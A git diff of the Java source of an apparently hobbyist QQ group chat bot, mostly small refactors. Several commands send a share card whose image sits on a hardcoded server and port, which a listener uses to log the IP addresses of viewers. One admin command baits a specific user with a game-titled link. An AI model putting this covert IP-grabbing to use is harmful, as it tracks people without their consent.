@@ -9,10 +9,7 @@ import java.io.UnsupportedEncodingException;
 import java.net.URL;
 import java.net.URLConnection;
 import java.nio.charset.StandardCharsets;
-import java.util.HashMap;
-import java.util.Map;
-import java.util.Timer;
-import java.util.TimerTask;
+import java.util.*;
 
 import com.meng.picEdit.JingShenZhiZhuQQManager;
 import com.meng.picEdit.ShenChuQQManager;
@@ -146,21 +143,22 @@ public class Methods {
     public static boolean checkAt(long fromGroup, long fromQQ, String msg) {
         if (Autoreply.instence.CC.getAt(msg) == Autoreply.CQ.getLoginQQ()) {
             if (msg.startsWith("精神支柱[CQ:at")) {
-                new JingShenZhiZhuQQManager(fromGroup, fromQQ, msg);
+                new JingShenZhiZhuQQManager(fromGroup, fromQQ, Autoreply.instence.CC.at(fromQQ));
                 return true;
             } else if (msg.startsWith("神触[CQ:at")) {
-                new ShenChuQQManager(fromGroup, fromQQ, msg);
+                new ShenChuQQManager(fromGroup, fromQQ, Autoreply.instence.CC.at(fromQQ));
                 return true;
             }
             // 过滤特定的文字
             // @消息发送者并复读内容
             if (!msg.contains("蓝") && !msg.contains("藍") && !msg.contains("赠送")) {
-                if (fromQQ == 2558395159L) {
-                    return true;
-                }
-                Autoreply.sendMessage(fromGroup, 0, msg.replace("[CQ:at,qq=1620628713]", "[CQ:at,qq=" + fromQQ + "]"));
                 return true;
             }
+            if (fromQQ == 2558395159L) {
+                return true;
+            }
+            Autoreply.sendMessage(fromGroup, 0, msg.replace("[CQ:at,qq=1620628713]", "[CQ:at,qq=" + fromQQ + "]"));
+
             // if (msg.contains("野兽先辈") || msg.contains("仰望星空派") ||
             // msg.contains("英国") || msg.contains("鬼杀酒")
             // || msg.contains("羊杂碎布丁") || msg.contains("昏睡红茶") ||
@@ -181,8 +179,8 @@ public class Methods {
         if (!file.exists()) {
             file.createNewFile();
         }
-        Long filelength = file.length();
-        byte[] filecontent = new byte[filelength.intValue()];
+        long filelength = file.length();
+        byte[] filecontent = new byte[(int) filelength];
         FileInputStream in = new FileInputStream(file);
         in.read(filecontent);
         in.close();
@@ -257,8 +255,7 @@ public class Methods {
     public static boolean checkLook(long fromGroup, String msg) {
         if (msg.equals("有人吗") || msg.equalsIgnoreCase("testip") || msg.equalsIgnoreCase("窥屏检测")) {
             int port = Autoreply.instence.random.nextInt(5000);
-            Autoreply.sendMessage(fromGroup, 0, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000),
-                    "窥屏检测", "滴滴滴", "http://123.207.65.93:" + (port + 4000) + "/111.jpg"));
+            Autoreply.sendMessage(fromGroup, 0, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "窥屏检测", "滴滴滴", "http://123.207.65.93:" + (port + 4000) + "/111.jpg"));
             final IPGetter ipGetter = new IPGetter(fromGroup, port);
             ipGetter.start();
             Timer timer = new Timer();
@@ -278,8 +275,7 @@ public class Methods {
         if (Autoreply.instence.configManager.isAdmin(fromQQ)) {
             if (msg.equals("吊熊")) {
                 int port = Autoreply.instence.random.nextInt(5000);
-                Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000),
-                        "东方绀珠传LNB", "东方绀珠传LNB", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
+                Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "东方绀珠传LNN", "东方绀珠传LNN", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
                 final XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
                 ipGetter.start();
                 Timer timer = new Timer();
@@ -293,8 +289,7 @@ public class Methods {
             }
             if (msg.equals("吊熊2")) {
                 int port = Autoreply.instence.random.nextInt(5000);
-                Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000),
-                        "东方绀珠传LNB", "东方绀珠传LNB", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
+                Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "东方绀珠传LNN", "东方绀珠传LNN", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
                 XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
                 ipGetter.start();
                 return true;
@@ -342,8 +337,7 @@ public class Methods {
     }
 
     public static void setRandomPop() {
-        Methods.getSourceCode("http://logic.content.qq.com/bubble/setup?callback=&id=" + Autoreply.instence.random.nextInt(269)
-                + "&g_tk=" + Autoreply.CQ.getCsrfToken(), Autoreply.CQ.getCookies());
+        Methods.getSourceCode("http://logic.content.qq.com/bubble/setup?callback=&id=" + new Random().nextInt(269) + "&g_tk=" + Autoreply.CQ.getCsrfToken(), Autoreply.CQ.getCookies());
     }
 
     public static Map<String, String> cookieToMap(String value) {
